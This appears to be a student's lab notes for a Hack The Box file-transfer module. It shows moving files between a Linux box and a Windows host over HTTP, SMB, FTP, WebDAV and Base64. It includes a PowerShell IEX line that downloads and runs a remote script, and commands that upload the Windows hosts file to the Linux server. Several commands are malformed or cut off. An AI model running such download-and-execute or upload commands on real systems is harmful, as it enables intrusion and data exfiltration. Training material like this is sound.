# [[PowerShell Base64 Encode & Decode]] | [[SMB Uploads]] | [[FTP Uploads]] | [[PowerShell Web Uploads]] | [[SMB Downloads & FTP Downloads]]

## **In Linux machine**

Download `upload_win.zip` from HTB web, Unzip it and check the content and the hash:

```shell
unzip Downloads/upload_win.zip  
cat upload_win.txt  
md5sum upload_win.txt
```

Encode to Base64:

```shell
base64 upload_win.txt >> base64encoded.txt  
cat base64encoded.txt
```

## **In Window Machine**

Open PowerShell and decode (paste your Base64 string where indicated):

```Powershell
cd desktop  
[IO.File]::WriteAllBytes("C:\users\htb-student\Desktop\decoded.txt , [Convert]FromBase64String::("*Copy the encoded base64 string here*"))  
cat decoded.txt
```

Check the hash:

```Powershell
Get-FileHash .\decoded.txt -Algorithm md5
```

___

## 1. PowerShell Web Downloads

```Powershell
wget https://academy.hackthebox.com/storage/modules/24/upload_win.zip -OutFile upload_win.zip
```

**Linux Machine — quick web server:**

``` Shell
pip3 install uploadserver  
python3 -m uploadserver
```

**Windows Box (download):**

```Powershell
wget http://<linux server IP>:8000/upload_win.txt
```

![[Pasted image 20260430160247.png]]

## 2. SMB Downloads

**Linux machine (create SMB share):**

```Shell
mkdir /tmp/smbshare  
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

Copy the file into the share:

```Shell
mv upload_win.txt /tmp/smbshare/upload_win.txt
```

**Windows Box (download via SMB):**

```Powershell
copy \\<our linux machine IP>\share\upload_win.txt  
ls
```
![[Pasted image 20260430160403.png]]

```Powershell
Get-Filehash upload_win.txt -Algorithm md5
```

## 3. FTP Downloads

**Linux Machine (start FTP server):**

```Shell
sudo pip3 install pyftpdlib  
sudo python3 -m pyftpdlib --port 21
```

**Windows Box (download from FTP):**

```Powershell
(New-Object Net.WebClient).DownloadFile('ftp://<our linux machine IP>/upload_win.txt', 'C:\Users\htb-student\Desktop\ftp-file.txt
```

```Powershell
ls
Get-FileHash ftp-file.txt -Algorithm md5
```
![[Pasted image 20260430160553.png]]
![[Pasted image 20260430160603.png]]

## 4. PowerShell Base64 Encode & Decode

**Windows box — check file & hash:**

```Powershell
cat C:\Windows\system32\drivers\etc\hosts  
Get-Filehash C:\Windows\system32\drivers\etc\hosts -Algorithm md5
```
![[Pasted image 20260430160647.png]]

**Convert file to base64 and copy to clipboard:**

```Powershell
[Convert]::ToBase64String((Get-Content "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)) | Set-Clipboard
```
![[Pasted image 20260430160713.png]]

**Linux machine — paste and decode:**

```Shell
echo '<add the copied string>' | base64 -d > hosts  
ls  
cat hosts
```
![[Pasted image 20260430160731.png]]
## 5. PowerShell Web Upload

**Linux Machine (server):**

```Shell
pip3 install uploadserver  
python3 -m uploadserver
```

**Windows Box (upload using a PowerShell script):**

```Powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')  
Invoke-FileUpload "C:\Windows\system32\drivers\etc\hosts" http://<linux server ip>:8000/upload
```

## 6. SMB Upload (WebDAV fallback)

**Linux Machine (start WebDAV):**

```Shell
sudo pip3 install wsgidav cheroot  
sudo wsgidav --host=0.0.0.0 --port=80 --root=. --auth=anonymous
```

**Windows box — try accessing:**

```Powershell
dir \\<our linux machine IP>\DavWWWRoot
```
![[Pasted image 20260430160940.png]]
![[Pasted image 20260430160945.png]]

## 7. FTP Upload

**Linux Machine (start FTP server):**

```Shell
sudo pip3 install pyftpdlib  
sudo python3 -m pyftpdlib --port 21
```

**Windows Box (upload file to Linux FTP):**

```Powershell
(New-Object Net.WebClient).UploadFile('ftp://<our linux machine IP>/ftp-hosts', 'C:\Wi
```

**Linux — check file and hash:**

```Shell
ls  
cat ftp-hosts  
md5sum ftp-hosts
```
